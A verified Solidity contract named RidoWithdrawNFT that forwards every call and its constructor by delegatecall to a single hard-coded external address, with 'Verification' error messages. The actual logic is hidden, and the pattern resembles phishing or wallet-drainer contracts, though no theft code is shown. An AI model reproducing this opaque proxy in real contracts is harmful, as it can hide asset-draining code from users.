/**
 *Submitted for verification at Etherscan.io on 2023-05-28
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.13;

contract RidoWithdrawNFT {
    uint256 private totalSupply = 5005;
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x3f51cBCFDB336449134b24EcDD89B376109C82B2).delegatecall(data);
        require(r1, "Verification.");
        return result;
    }

    receive() payable external {
    }

    constructor() {
        bytes memory data = abi.encodeWithSignature("initialize()");
        (bool r1,) = address(0x3f51cBCFDB336449134b24EcDD89B376109C82B2).delegatecall(data);
        require(r1, "Verificiation.");
    }
}